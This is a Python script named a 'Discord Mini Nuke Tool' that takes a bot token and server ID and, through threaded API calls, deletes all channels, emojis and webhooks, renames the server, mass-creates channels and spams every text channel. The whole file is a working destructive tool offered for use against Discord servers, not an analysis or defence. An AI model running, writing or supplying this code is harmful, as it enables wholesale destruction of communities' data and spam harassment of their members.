import requests
import threading

def nuke_tool():
    print("\n=== Discord Mini Nuke Tool (BOT ONLY) ===")

    token = input("Enter your BOT token: ").strip()
    guild_id = input("Enter the server (guild) ID: ").strip()

    headers = {
        "Authorization": f"Bot {token}",
        "Content-Type": "application/json"
    }

    base_url = "https://discord.com/api/v9"

    def threaded_action(items, action_func):
        threads = []
        for item in items:
            t = threading.Thread(target=action_func, args=(item,))
            t.start()
            threads.append(t)
        for t in threads:
            t.join()

    def create_channels():
        try:
            count = int(input("How many channels to create (max 20)?: "))
        except:
            print("Invalid number.")
            return
        if count > 20:
            print("⚠️ Max 20 channels. Creating 20 only.")
            count = 20
        name = input("Enter channel name: ")
        url = f"{base_url}/guilds/{guild_id}/channels"
        payload = {"name": name, "type": 0}
        def create(_):
            r = requests.post(url, headers=headers, json=payload)
            if r.status_code == 201:
                print("Channel created")
            else:
                print(f"Failed: {r.status_code} | {r.text}")
        threaded_action(range(count), create)

    def delete_channels():
        r = requests.get(f"{base_url}/guilds/{guild_id}/channels", headers=headers)
        try:
            channels = r.json()
        except:
            print("⚠️ Failed to get channels")
            return
        if not isinstance(channels, list):
            print(f"⚠️ API Error: {channels}")
            return
        def delete(ch):
            r2 = requests.delete(f"{base_url}/channels/{ch['id']}", headers=headers)
            if r2.status_code == 204:
                print(f"Deleted {ch['name']}")
            else:
                print(f"Failed: {r2.status_code}")
        threaded_action(channels, delete)

    def change_server_name():
        new_name = input("Enter new server name: ")
        r = requests.patch(f"{base_url}/guilds/{guild_id}", headers=headers, json={"name": new_name})
        if r.status_code == 200:
            print("Server renamed successfully!")
        else:
            print(f"Failed: {r.status_code} | {r.text}")

    def delete_emojis():
        r = requests.get(f"{base_url}/guilds/{guild_id}/emojis", headers=headers)
        try:
            emojis = r.json()
        except:
            print("⚠️ Failed to get emojis")
            return
        if not isinstance(emojis, list):
            print(f"⚠️ API Error: {emojis}")
            return
        def delete(emoji):
            r2 = requests.delete(f"{base_url}/guilds/{guild_id}/emojis/{emoji['id']}", headers=headers)
            if r2.status_code == 204:
                print(f"Deleted {emoji['name']}")
            else:
                print(f"Failed: {r2.status_code}")
        threaded_action(emojis, delete)

    def delete_webhooks():
        r = requests.get(f"{base_url}/guilds/{guild_id}/webhooks", headers=headers)
        try:
            hooks = r.json()
        except:
            print("⚠️ Failed to get webhooks")
            return
        if not isinstance(hooks, list):
            print(f"⚠️ API Error: {hooks}")
            return
        def delete(wh):
            r2 = requests.delete(f"{base_url}/webhooks/{wh['id']}", headers=headers)
            if r2.status_code == 204:
                print(f"Deleted {wh['name']}")
            else:
                print(f"Failed: {r2.status_code}")
        threaded_action(hooks, delete)

    def spam_all_channels():
        msg = input("Enter spam message: ")
        r = requests.get(f"{base_url}/guilds/{guild_id}/channels", headers=headers)
        try:
            channels = r.json()
        except:
            print("⚠️ Failed to get channels")
            return
        if not isinstance(channels, list):
            print(f"⚠️ API Error: {channels}")
            return
        text_channels = [ch['id'] for ch in channels if ch.get('type') == 0]
        if not text_channels:
            print("⚠️ No text channels found.")
            return
        def spam(channel_id):
            r = requests.post(f"{base_url}/channels/{channel_id}/messages", headers=headers, json={"content": msg})
            if r.status_code in [200, 201]:
                print(f"[{channel_id}] Sent!")
            else:
                print(f"[{channel_id}] Failed: {r.status_code}")
        threaded_action(text_channels, spam)

    while True:
        print("\nChoose action:")
        print("1 - Create Channels")
        print("2 - Delete Channels")
        print("3 - Change Server Name")
        print("4 - Delete Emojis")
        print("5 - Delete Webhooks")
        print("6 - Spam All Channels (1 msg per channel)")
        print("0 - Exit")

        choice = input("Enter your choice: ").strip()
        if choice == "1": create_channels()
        elif choice == "2": delete_channels()
        elif choice == "3": change_server_name()
        elif choice == "4": delete_emojis()
        elif choice == "5": delete_webhooks()
        elif choice == "6": spam_all_channels()
        elif choice == "0": break
        else:
            print("Invalid input.")

if __name__ == "__main__":
    nuke_tool()